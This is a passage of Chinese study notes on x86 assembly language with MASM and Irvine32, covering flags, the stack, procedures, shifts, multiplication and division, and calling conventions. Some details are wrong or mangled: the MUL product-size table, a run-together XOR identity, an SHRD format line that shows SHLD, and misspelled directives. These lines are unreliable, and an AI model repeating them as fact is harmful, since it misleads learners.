id="加法和减法">加法和减法</h3><p><code>INC</code>和<code>DEC</code>指令分别对应寄存器或内存操作数加一和减一，需要注意的是这两个指令不会改变进位标志位</p><p><code>ADD</code>指令将<code>长度相同</code>的源操作数和目的操作数进行相加，<code>SUB</code>指令从目的操作数减去源操作数</p><p><code>NEG</code>(非)指令通过把操作数转换为其二进制补码，将操作数的符号取反，可以将整数转为负数</p><h3 id="标志位">标志位</h3><ul><li><p>进位标志意味着无符号整数溢出 (CF/CY)</p><blockquote><p>如果和数超过了目的操作数的存储大小，就可以认为 CF = 1</p><p>从较小的无符号整数中减去较大的无符号整数时，减法操作就会将进位标志位置 1</p></blockquote></li><li><p>溢出标志意味着有符号整数溢出 (OF/OV)</p><blockquote><p>有符号数算术操作结果与目的操作数相比，如果发生上溢或者下溢，则溢出标志位置 1</p><p>OF = CF XOR 运算结果最后的二进制最高位</p></blockquote></li><li><p>零标志位意味着操作结果为 0 (ZF/ZR)</p></li><li><p>符号标志位意味着操作产生的结果为负数 (SF/PL)</p><blockquote><p>有符号数算术操作结果为负数，则符号标志位置 1</p></blockquote></li><li><p>奇偶进位标志值在一条算术或者布尔运算执行后，立即判断目的操作数最低有效字节(二进制下的后 8 位)中 1 的个数是否为偶数 (PF/PE)</p><blockquote><p>目的操作数最低有效字节(二进制下的后 8 位)中 1 的个数为偶数时置 1</p></blockquote></li><li><p>辅助进位标志位置 1 ，意味着目的操作数最低有效字节中位 3 有进位 (AF/AC)</p><blockquote><p>主要用于二进制编码的十进制数(BCD)运算</p></blockquote></li></ul><h3 id="与数据相关的运算符和伪指令">与数据相关的运算符和伪指令</h3><p><code>OFFSET</code>运算符返回的是一个变量与其所在段起始地址之间的距离</p><p><code>PTR</code>运算符可以重写操作数默认的大小类型</p><p><code>TYPE</code>运算符返回第是一个操作数或数组中每个元素的大小(按字节计算)</p><p><code>LENGTHOF</code>运算符返回的是数组中元素的个数</p><p><code>SIZEOF</code>运算符返回的是数组初始化时使用的字节数</p><p><code>LABEL</code>伪指令可以插入一个标号，并定义它的大小属性，但是不为这个标号分配存储空间</p><blockquote><p>个人理解: <code>LABEL</code>创建了一个对应类型的一个框，不占据任何空间，当有数据被定义时便会放在框内，直到框装满，对应的变量的值便是框内数据</p></blockquote><h3 id="循环">循环</h3><p><code>JMP</code>无条件跳转到一条指令处，<code>LOOP</code>使用<code>ECX</code>作为计数器，当<code>ECX</code>等于 0 时结束循环，再循环过程中每次<code>ECX</code>会减 1，如果将<code>ECX</code>初始值设置为 0，在第一次循环后减一会造成溢出，产生<code>FFFFFFFF</code>，而形成巨大的循环</p><h2 id="过程">过程</h2><h3 id="堆栈操作">堆栈操作</h3><p>在<code>堆栈</code>中，新值将被添加到栈顶，删除值也在栈顶移除，被称为<code>LIFO</code>(先进后出)结构，原因是：最后进入堆栈的值也是第一个出堆栈的值</p><p><code>运行时堆栈</code>是内存数组，<code>CPU</code>通过<code>ESP</code>对其进行直接管理，该寄存器也被称为堆栈指针寄存器，<code>ESP</code>存放的是堆栈中某个位置的 32 位偏移量。<code>ESP</code>基本不会直接被程序员控制，反之，它是用<code>CALL</code>、<code>RET</code>、<code>PUSH</code>和<code>POP</code>等指令间接修改</p><p><code>ESP</code>总是指向最后压入堆栈的数据，运行时堆栈在内存中是向下生长的，即从高地址向低地址扩展。数值在弹出堆栈后，栈顶指针增加(按堆栈元素大小)，指向堆栈中下一个最高位置</p><p>运行时堆栈的一些用途：</p><ul><li>当寄存器用于多个目的时，堆栈可以作为寄存器的一个方便的临时保存区。在寄存器被修改后,还可以恢复其初始值</li><li>执行CALL指令时，CPU在堆栈中保存当前过程的返回地址</li><li>调用过程时,输入数值也被称为参数，通过将其压入堆栈实现参数传递。堆栈也为过程局部变量提供了临时存储区域</li></ul><p><code>PUSH</code>指令首先减少<code>ESP</code>的值，再将源操作数复制到堆栈。</p><p><code>POP</code>指令先把<code>ESP</code>指向的堆栈元素内容复制到一个 16 位或 32 位的目的操作数中，再增加<code>ESP</code>的值</p><p><code>PUSHFD</code>将 32 位<code>EFLAGS</code>寄存器内容压入堆栈。<code>POPFD</code>吧栈顶内容弹出到<code>EFLAGS</code>寄存器</p><blockquote><p>不能用<code>MOV</code>指令将标识寄存器内容复制给一个变量，因此，<code>PUSHFD</code>是保护标志位的最佳途径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">pushfd; 保存标志寄存器<br>;<br>; 任意语句序列<br>;<br>popfd; 恢复标志寄存器<br></code></pre></td></tr></table></figure><p>采用上述方式使用入栈和出栈指令时，必须要确保程序的指向路径不会跳过<code>POPFD</code>指令</p></blockquote><p><code>PUSHAD</code>指令按照<code>EAX</code>、<code>ECX</code>、<code>EDX</code>、<code>EBX</code>、<code>ESP</code>(执行<code>PUSHAD</code>之前的值)、<code>EBP</code>、<code>ESI</code>和<code>EDI</code>的顺序，将所有 32 位通用寄存器压入堆栈。<code>POPAD</code> 指令按照相反顺序将同样的寄存器弹出堆栈。与之相似，<code>PUSHA</code>指令按序(<code>AX</code>、<code>CX</code>、<code>DX</code>、<code>BX</code>、<code>SP</code>、<code>BP</code>、<code>SI</code>和<code>DI</code>)将16位通用寄存器压入堆栈。<code>POPA</code>指令按照相反顺序将同样的寄存器弹出堆栈。</p><p>需要注意的是，过程用一个或者多个寄存器返回结构时不应使用<code>PUSHA</code>和<code>PUSHAD</code>，这两个指令都保存了对应的保存的寄存器值，若中间有过程用寄存器传递可能会丢失数据</p><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs assembly">read PROC<br>PUSHAD<br>.<br>.<br>mov eax,return_value<br>.<br>.<br>POPAD<br>ret; EAX的值被覆盖了<br>read ENDP<br></code></pre></td></tr></table></figure><p>上述调用<code>POPAD</code>将会覆盖<code>EAX</code>的返回值，导致返回数据丢失</p></blockquote><h3 id="定义并使用过程">定义并使用过程</h3><p>汇编语言中经常使用通用寄存器来传递参数</p><p>过程可以非正式地定义为:由返回语句结束的已命名的语句块。过程用<code>PROC</code>和<code>ENDP</code>伪指令来定义，并且必须为其分配一个名字(有效标识符)</p><p><code>PORC</code>和<code>ENDP</code>伪指令来定义一个过程，当在程序启动过程之外创建一个过程时，就用<code>RET</code>指令来结束它。RET强制CPU返回到该过程被调用的位置：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">main PROC<br>.<br>.<br>ret<br>main ENDP<br></code></pre></td></tr></table></figure><p>默认情况下，标号只在其被定义的过程中可见。解决这个限制可以定义全局标号，即在名字后面加双冒号(::)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">Destination ::<br></code></pre></td></tr></table></figure><p><code>CALL</code>指令执行时将下一条指令的地址压入栈中，再把被调用过程的地址复制到指令指针寄存器中(EIP)</p><p><code>RET</code>指令执行时先将<code>ESP</code>的值弹道<code>EIP</code>中，然后<code>ESP</code>向高地址移动</p><img src="https://s2.loli.net/2022/06/23/PuQaif6qB3Ymczp.png" style="zoom:90%;" /><img src="https://s2.loli.net/2022/06/23/T7tPLYsWqBzNHnD.png" style="zoom: 67%;" /><p>与<code>PROC</code>伪指令一起使用的<code>USES</code>运算符，列出了过程修改的全部寄存器。汇编器产生代码，在程序开始时将寄存器的内容压人堆栈，并在过程返回前弹出恢复寄存器。</p><p><code>USES</code>运算符与<code>PROC</code>伪指令一起使用，让程序员列出在该过程中修改的所有寄存器名。<code>USES</code>告诉汇编器做两件事情:</p><p>第一，在过程开始时生成<code>PUSH</code>指令，将寄存器保存到堆栈;</p><p>第二，在过程结束时生成<code>POP</code>指令，从堆栈恢复寄存器的值。</p><p><code>USES</code>运算符紧跟在<code>PROC</code>之后，其后是位于同一行上的寄存器列表，表项之间用空格符或制表符(不是逗号)分隔。</p><h3 id="外部连接库">外部连接库</h3><p>链接库(<code>.inc</code>)是一种文件，包含了已经汇编为机器代码的过程(子程序)。链接库开始时是一个或者多个源文件，这些文件再被汇编为目标文件</p><p>链接库通过<code>include</code>进行导入：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">include Irvine32.inc<br></code></pre></td></tr></table></figure><p>通过链接库可以直接调用内部现有的功能函数，<code>Irvine32.inc</code>中包含如下过程：</p><img src="https://s2.loli.net/2022/06/23/hUugkmKVf3EvNaM.png" style="zoom:80%;" /><img src="https://s2.loli.net/2022/06/23/e3ahMou9cEglfUS.png" style="zoom:70%;" /><h2 id="条件处理">条件处理</h2><h3 id="条件分支">条件分支</h3><p>允许作决策的编程语言使程序员可以改变控制流，使用的技术成为<code>条件分支</code></p><p>通过布尔运算可以很方便的更改一个数字的单个位，布尔指令影响对应的<code>零标志位</code>、<code>进位标志位</code>、<code>符号标志位</code>、<code>溢出标志位</code>和<code>奇偶标志位</code></p><p><code>AND</code>指令将两个数进行<code>与运算</code>，要求对应的两个数的大小相等，操作数可以是8、16、32、64位。</p><blockquote><p>1 and 1 = 1</p><p>0 and 1 = 0</p><p>0 and 0 = 0</p><p>两个数同时为 1 的时候运算结果才为 1 ，反之则为 0</p></blockquote><p><code>OR</code>指令将两个数进行<code>或运算</code>，同样要求两个数的大小相等，操作数可以是8、16、32、64位</p><blockquote><p>1 or 1 = 1</p><p>0 or 1 = 1</p><p>0 or 0 = 0</p><p>两个数中有一个数字为 1 那么运算的结果便为 1</p></blockquote><p><code>XOR</code>指令将两个数进行<code>异或运算</code>，操作数组合和大小与<code>AND</code>和<code>OR</code>指令相同</p><blockquote><p>0 xor 0 = 0</p><p>1 xor 1 = 0</p><p>0 xor 1 = 1</p><p>两个数字不同时进行<code>xor</code>运算的结果为 1 ，两个数字相同时<code>xor</code>结果为 0 ，同时<code>xor</code>具备有可逆性有如下性质：</p><p>A XOR B = CC XOR B = AC XOR A = B</p></blockquote><p><code>NOT</code>指令将操作数的所有位进行翻转(0 -&gt; 1 , 1 -&gt; 0)，其结果为反码，需要注意的时<code>NOT</code>指令不会影响标志位</p><p><code>TEST</code>指令将两个操作数对应位之间进行<code>AND</code>操作，根据其运算结果设置对应的<code>符号标志位</code>、<code>零标志位</code>和<code>奇偶标志位</code>，<code>TEST</code>指令不改变对应的目标操作数，可以用于发现操作数中单个位是否置位(某个位上是否为 1)</p><blockquote><p><code>TEST</code>指令总是清除<code>溢出</code>和<code>进位标志位</code>，其修改<code>符号标志位</code>、<code>零标志位</code>和<code>奇偶标志位</code>的方式与<code>AND</code>指令相同</p></blockquote><p><code>CMP</code>用于比较两个操作数，内部隐含一个减法操作，并且不会修改任何操作数，常常用于创建条件分支</p><h3 id="一些置位方式">一些置位方式</h3><p>零标志位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">test al,0; 零标志位置 1<br>and al,0; 零标志位置 1<br>or al,1; 零标志位清零<br></code></pre></td></tr></table></figure><p>符号标志位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">or al,80h; 符号标志位置 1 80h -&gt; 1000 0000<br>and al,7Fh; 符号标志位清零   7F -&gt; 0111 1111<br></code></pre></td></tr></table></figure><p>进位标志位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">stc; 进位标志位置 1<br>clc; 进位标志位清零<br></code></pre></td></tr></table></figure><p>溢出标志位置 1 ，就把两个正数相加使其产生负的和数；若要清除溢出标志位，则将操作数和 0 进行<code>OR</code>操作</p><h3 id="条件跳转">条件跳转</h3><p>第一步先使用<code>CMP</code>、<code>AND</code>或<code>SUB</code>操作改变<code>CPU</code>的状态标志位，随后使用<code>条件跳转指令</code>来对<code>标志位</code>进行测试，而产生新的分支</p><p><img src="https://s2.loli.net/2022/06/25/4zFIxHBo76dUrMi.png" alt=""></p><img src="https://s2.loli.net/2022/06/25/vqCVzOUTf3bYhNw.png" style="zoom:80%;" /><img src="https://s2.loli.net/2022/06/25/5v38l9ROwYTGzp2.png" style="zoom:80%;" /><img src="https://s2.loli.net/2022/06/25/hp6Fj2MmXZIuNCe.png" style="zoom:80%;" /><img src="https://s2.loli.net/2022/06/25/2MDTH4lOCWRqoJL.png" alt="13.png" style="zoom:80%;" /><h3 id="条件循环指令">条件循环指令</h3><p><code>LOOPZ</code>(为零跳转）指令的工作和<code>LOOP</code>指令相同，只是有一个附加条件:为零控制转向目的标号，零标志位必须置 1。<code>LOOPE</code>(相等跳转)指令相当于<code>LOOPZ</code>两者有相同的操作码，执行以下任务:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ecx</span> = ecx - <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> ecx &gt; <span class="hljs-number">0</span> and zf = <span class="hljs-number">1</span> <br><span class="hljs-attribute">jump</span> to destination<br></code></pre></td></tr></table></figure><p>两者均不改变对应的状态标志位，如果处于 64 位下便采用<code>rcx</code>作为对应循环计数器</p><p><code>LOOPNZ</code>(非零跳转）指令与<code>LOOPZ</code>(为零跳转)相对应。当<code>ECX</code>中无符号数值大于零(减 1 操作之后)且零标志位等于零时,继续循环。<code>LOOPNE</code>(不等跳转)指令相当于<code>LOOPNZ</code>，它们有相同的操作码，执行以下任务:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ecx</span> = ecx - <span class="hljs-number">1</span><br><span class="hljs-attribute">if</span> ecx &gt; <span class="hljs-number">0</span> and zf =<span class="hljs-number">0</span><br><span class="hljs-attribute">jump</span> to destination<br></code></pre></td></tr></table></figure><p>条件循环指令与普通的循环指令相似，不同的是需要额外判断对应<code>CPU</code>中的状态标志位，当两者(ECX != 0 和 条件标志位满足)同时成立时，便发生跳转</p><h3 id="条件分支与循环伪指令">条件分支与循环伪指令</h3><p>条件分支(IF语句)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.IF condition1<br>statements<br>.ELSEIFcondition2<br>statements<br>.ENDIF<br></code></pre></td></tr></table></figure><p>在<code>condition</code>中可以采用与高级语言同样的关系和逻辑运算符，同时也存在一些特殊运算符：</p><table><thead><tr><th style="text-align:center">运算符</th><th style="text-align:center">说明</th></tr></thead><tbody><tr><td style="text-align:center">OVERFLOW?</td><td style="text-align:center">若溢出标志置 1 ，则返回“真”</td></tr><tr><td style="text-align:center">CARRY?</td><td style="text-align:center">若进位标志置 1 ，则返回“真”</td></tr><tr><td style="text-align:center">PARITY?</td><td style="text-align:center">若奇偶标志置 1 ，则返回“真”</td></tr><tr><td style="text-align:center">SIGN?</td><td style="text-align:center">若符号标志置 1 ，则返回“真”</td></tr><tr><td style="text-align:center">ZERO?</td><td style="text-align:center">若零标志置 1 ，则返回“真”</td></tr></tbody></table><p>循环语句</p><p>do-while</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.REPEAT<br>statements<br>.UNITL condition<br></code></pre></td></tr></table></figure><p>while</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs assembly">.WHILE<br>statements<br>.ENDW<br></code></pre></td></tr></table></figure><h2 id="整数运算">整数运算</h2><h3 id="移位和循环移位指令">移位和循环移位指令</h3><p>溢出：当一个有符号数进行循环移位时发生了符号位的取反( 0 -&gt; 1 或 1 -&gt; 0 )时，溢出标志位置 1</p><p>逻辑移位：在移位过程中空出来的高位用 0 进行填充</p><p><img src="https://s2.loli.net/2022/06/27/qKyGjDH9p4XAnTo.png" alt=""></p><p>算术移位：在移位过程中空出来的高位用符号位进行填充</p><p><img src="https://s2.loli.net/2022/06/27/KfhTkOioQnSDB39.png" alt=""></p><hr><p><code>SHL</code>指令将目的操作数逻辑左移移位，最低位用 0 进行填充，其中最高位会移入进位标志位上，每向左移位一次相当于乘以 2</p><p><img src="https://s2.loli.net/2022/06/27/L2BzFh7stfIjbGq.png" alt=""></p><p><code>SHR</code>指令将目的操作数逻辑右移移位，最高位用 0 进行填充，其中最后一位被移除的会置于进位标志位上，每向右移位一次相当于除以 2</p><p><img src="https://s2.loli.net/2022/06/27/fEqbkyWGhw49RYd.png" alt=""></p><hr><p><code>SAL</code>(算术左移)指令与<code>SHL</code>相同，每次移动时将最低为用 0 进行填充，其中最高位会移入进位标志位上</p><p><img src="https://s2.loli.net/2022/06/27/MdxzQH28yYOqgL1.png" alt=""></p><p><code>SAR</code>进行算术右移，<code>SAL</code>与<code>SAR</code>两者的操作数类型与<code>SHL</code>和<code>SHR</code>完全相同</p><p><img src="https://s2.loli.net/2022/06/27/eEbtSmirCOFkyM4.png" alt=""></p><hr><p><code>ROL</code>以循环方式来进行移位，该指令将数的一段移动到另一端，并不会丢弃位，当循环计数次数大于 1 时，进位标志位保存的是最后循环位移出<code>MSB</code>的位</p><p><img src="https://s2.loli.net/2022/06/27/f4xNEm39hTodgL5.png" alt=""></p><blockquote><p>可以利用该方式将一个数字的高 4 位与低 4 位进行交换</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov al,26h<br>rol al,4; al = 62h<br></code></pre></td></tr></table></figure></blockquote><p><code>ROR</code>(循环右移)指令把所有位都向右移，最低位复制到进位标志位和最高位。该指令格式与SHL指令相同</p><p><img src="https://s2.loli.net/2022/06/27/6prmwqa4d8oP5WA.png" alt=""></p><p>与之相似的是当循环计数值大于1时，进位标志位保存的是最后循环移出LSB的位</p><hr><p><code>RCL</code>(带进位循环左移)指令把每一位都向左移，进位标志位复制到LSB，而MSB复制到进位标志位</p><p><img src="https://s2.loli.net/2022/06/27/7khEqoUcb4ClYX8.png" alt=""></p><blockquote><p>此处的<code>带进位</code>指的是进位标志位也参与到移位中</p></blockquote><p><code>RCR</code>(带进位循环右移)指令把每一位都向右移，进位标志位复制到<code>MSB</code>,而<code>LSB</code>复制到进位标志位</p><p><img src="https://s2.loli.net/2022/06/27/scNyV4eOp6qgtFY.png" alt=""></p><hr><p><code>SHLD</code>(双精度左移)指令将目的操作数向左移动指定位数。移动形成的空位由源操作数的高位填充。源操作数不变，但是符号标志位、零标志位、辅助进位标志位、奇偶标志位和进位标志位会受影响，格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SHLD dest,source,count<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/06/27/Sbq4fVQpcFXG87N.png" alt=""></p><p><code>SHRD</code>(双精度右移)指令将目的操作数向右移动指定位数。移动形成的空位由源操作数的低位格式为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">SHLD dest,source,count<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/06/27/IKm13vOUaX7Dg6o.png" alt=""></p><blockquote><p>一般为了在屏幕上进行图像的重定向而将位元组左右移动的时候，可以用<code>SHLD</code>和<code>SHRD</code>来处理位映射图像。或者在数据加密时可以用到两种移位方式。</p></blockquote><h3 id="乘法与除法指令">乘法与除法指令</h3><p>32 位模式下，<code>MUL</code>(无符号数乘法)指令有三种类型:第一种执行 8 位操作数与<code>AL</code>寄存器的乘法;第二种执行 16 位操作数与<code>AX</code>寄存器的乘法;第三种执行 32 位操作数与<code>EAX</code>寄存器的乘法。乘数和被乘数的大小必须保持一致，乘积的大小则是它们的一倍。这三种类型都可以使用寄存器和内存操作数,但不能使用立即数</p><p>往往来说两个数相乘可能会产生比其长度大一倍的数字，对此引入了两个寄存器(或者一个)分别保存结果的高位和地位</p><table><thead><tr><th style="text-align:center">被乘数</th><th style="text-align:center">乘数</th><th style="text-align:center">乘积</th></tr></thead><tbody><tr><td style="text-align:center">AL</td><td style="text-align:center">reg/mem8</td><td style="text-align:center">AX (AH为高 4 位，AL为低 4 位)</td></tr><tr><td style="text-align:center">AX</td><td style="text-align:center">reg/mem16</td><td style="text-align:center">DX:AX (DX为高 8 位，AX为低 8 位)</td></tr><tr><td style="text-align:center">EAX</td><td style="text-align:center">reg/mem32</td><td style="text-align:center">EDX:EAX (EDX为高 16 位，EAX为低 16 位)</td></tr></tbody></table><p><code>IMUL</code>(有符号数乘法)指令执行有符号整数乘法。与<code>MUL</code>指令不同，<code>IMUL</code>会保留乘积的符号，实现的方法是，将乘积低半部分的最高位符号扩展到高半部分</p><p><code>x86</code>指令集支持三种格式的<code>IMUL</code>指令:单操作数、双操作数和三操作数</p><blockquote><p>一般来说，在单操作数的情况下默认与<code>AL</code>(<code>AX</code>、<code>EAX</code>)相乘</p><p>三操作数时将成绩保存在第一个操作数中，第二个与第三个操作数进行乘法运算</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">imul <span class="hljs-keyword">A</span>,B,C     ==     <span class="hljs-keyword">A</span> = B * C<br></code></pre></td></tr></table></figure><p>和<code>MUL</code>指令一样，其乘积的存储大小使得溢出不会发生。同时，如果乘积的高半部分不是其低半部分的符号扩展，则进位标志位(CF)和溢出标志位(OF)置 1</p><p>利用这个特点可以决定是否忽略乘积的高半部分。即不是符号位扩展(OF = 1 )：不可以忽略乘积的高半部分</p></blockquote><p>32 位模式下，<code>DIV</code>(无符号除法)指令执行 8 位、16 位和 32 位无符号数除法。</p><table><thead><tr><th style="text-align:center">被除数</th><th style="text-align:center">除数</th><th style="text-align:center">商</th><th style="text-align:center">余数</th></tr></thead><tbody><tr><td style="text-align:center">AX</td><td style="text-align:center">reg/mem8</td><td style="text-align:center">AL</td><td style="text-align:center">AH</td></tr><tr><td style="text-align:center">DX:AX</td><td style="text-align:center">reg/mem16</td><td style="text-align:center">AX</td><td style="text-align:center">DX</td></tr><tr><td style="text-align:center">EDX:EAX</td><td style="text-align:center">reg/mem32</td><td style="text-align:center">EAX</td><td style="text-align:center">EDX</td></tr></tbody></table><p><code>IDIV</code>(有符号除法)指令执行有符号整数除法，其操作数与<code>DIV</code>指令相同。执行 8 位除法之前，被除数(<code>AX</code>)必须完成符号扩展。余数的符号总是与被除数相同。</p><blockquote><p>符号扩展指令：</p><p><code>CBW</code>(字节转字)指令将<code>AL</code>的符号位扩展到<code>AH</code>，保留了数据的符号</p><p><code>CWD</code>(字转双字)指令将<code>AX</code>的符号位扩展到<code>DX</code></p><p><code>CDQ</code>(双字转四字)指令将<code>EAX</code>的符号位扩展到<code>EDX</code></p></blockquote><p>需要注意的是执行<code>DIV</code>和<code>IDIV</code>后所有的算术运算状态标志位的值都不确定</p><p>异常：如果除法运算结果的商目的操作数存储不下时会引发溢出异常，同时如果除以 0 时会引发除零异常机制</p><p>对于溢出异常可以使用 32 位除数和 64 位被除数来减少出现除法溢出条件的可能性</p><blockquote><p>被除数 / 除数 = 商 … 余数</p></blockquote><h3 id="扩展加减法">扩展加减法</h3><p><code>ADC</code>(带进位加法)指令将源操作数和进位标志位的值都与目的操作数相加</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov dl,0<br>mov al,0FFh<br>add al,0FFh; AL = FEh<br>adc dl,0; DL/AL = 01FEh<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/06/27/zZF2iI15BGnv36W.png" alt=""></p><blockquote><p><code>ADC</code>指令相当于在普通的<code>ADD</code>指令的基础上加上了一个进位标志位(<code>CF</code>)，在运行加法运算时是使用高位进行运算</p></blockquote><p><code>SBB</code>(带借位减法)指令从目的操作数中减去源操作数和进位标志位的值</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs assembly">mov edx,7; 高 32 位<br>mov eax,1; 低 32 位<br>sub eax,2; 减 2<br>sbb edx,0; 高 32 位减法<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/06/27/kUwXnKDlGSQB7yc.png" alt=""></p><blockquote><p><code>SBB</code>指令也是相当于<code>SUB</code>指令的基础上减去了一个进位标志位(<code>CF</code>)，运行减法运算时是使用高位进行运算</p></blockquote><h2 id="高级过程">高级过程</h2><p>调用程序向子程序传递的数值被称为<code>实际参数</code>。而被调用的子程序要接收的数值被称为<code>形式参数</code>。</p><h3 id="堆栈帧">堆栈帧</h3><p><code>堆栈帧</code>是一块堆栈保留区域，用于存放被传递的实际参数、子程序的返回值、局部变量以及被保存的寄存器。</p><p>堆栈帧的创建步骤如下:</p><ol><li>被传递的实际参数。如果有,则压入堆栈</li><li>当子程序被调用时,使该子程序的返回值压入堆栈</li><li>子程序开始执行时,<code>EBP</code>被压入堆栈</li><li>设置<code>EBP</code>等于<code>ESP</code>。从这时开始，EBP就变成了该子程序所有参数的引用基址</li><li>如果有局部变量，修改<code>ESP</code>以便在堆栈中为这些变量预留空间</li><li>如果需要保存寄存器,就将它们压入堆栈</li></ol><p>在过程调用之前，任何存放参数的寄存器需要首先入栈，然后向其分配过程参数，再返回后再恢复起始值，同时当一个参数通过数值传递时，该值的副本会被压入堆栈，对于一个函数而言，其参数入栈的顺序是从右向左进行的。</p><p>一般而言，当一个过程的参数是一个数组时，我们常常将其所对应的地址进行压入堆栈中，节省操作的时间</p><p>访问堆栈中的数据我们可以使用<code>基址 —— 偏移量寻址</code>，用<code>[EBP+X]</code>获取到对应压入栈中的数据，需要注意的是在子程序返回的时候需要将参数从栈中进行删除，否则可能会造成内存泄漏，堆栈就会被破坏。</p><blockquote><p>调用规范：</p><p><strong>C 调用规范</strong></p><p>程序调用子程序时，在CALL指令的后面紧跟一条语句使堆栈指针(<code>ESP</code>)加上一个数，该数的值即为子程序参数所占堆栈空间的总和。一般而言一个参数占用的空间是<code>4 字节</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add esp,X; X 为 4 的倍数<br></code></pre></td></tr></table></figure><p><strong>STDCALL调用规范</strong></p><p><code>STDCALL</code>规范给<code>RET</code>指令添加了一个整数参数，这使得程序在返回到调用过程时，ESP会加上该数值。同时这个添加的整数必须与被调用过程参数占用的堆栈空间字节数相等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs assembly">ret X; X 为 4 的倍数<br></code></pre></td></tr></table></figure><p>上面代码等价于</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs assembly">add esp,X<br>ret<br></code></pre></td></tr></table></figure><p>要说明的是，<code>STDCALL</code>与<code>C</code>相似，参数是按逆序入栈的。通过在<code>RET</code>指令中添加参数，<code>STDCALL</code>不仅减少了子程序调用产生的代码量(减少了一条指令)，还保证了调用程序永远不会忘记清除堆栈。另一方面，<code>C</code>调用规范则允许子程序声明不同数量的参数，主调程序可以决定传递多少个参数。</p><p><code>C语言</code>的<code>printf</code>函数就是一个例子，它的参数数量取决于初始字符串参数中的格式说明符的个数。</p><hr><p><code>STDCALL</code>与<code>C语言</code>调用规范差异：</p><table><thead><tr><th style="text-align:center">c</th><th style="text-align:center">stdcall</th></tr></thead><tbody><tr><td style="text-align:center">在被调用函数 (<code>Callee</code>) 返回后，由调用方 (<code>Caller</code>) 调整堆栈。 1.调用方的函数调用 2.被调用函数的执行 3.被调用函数的结果返回 4.调用方清除调整堆栈</td><td style="text-align:center">在被调用函数 (<code>Callee</code>) 返回前，由被调用函数 (<code>Callee</code>) 调整堆栈。图示： 1.调用方的函数调用 2.被调用函数的执行 3.被调用函数清除调整堆栈 4.被调用函数的结果返回</td></tr><tr><td style="text-align:center">因为每个调用的地方都需要生成一段调整堆栈的代码，所以最后生成的文件较大。</td><td style="text-align:center">因为调整堆栈的代码只存在在一个地方（被调用函数的代码内），所以最后生成的文件较小。</td></tr><tr><td style="text-align:center">函数的参数个数可变(就像 <em><code>printf</code></em> 函数一样)，因为只有调用者才知道它传给被调用函数几个参数，才能在调用结束时适当地调整堆栈。</td><td 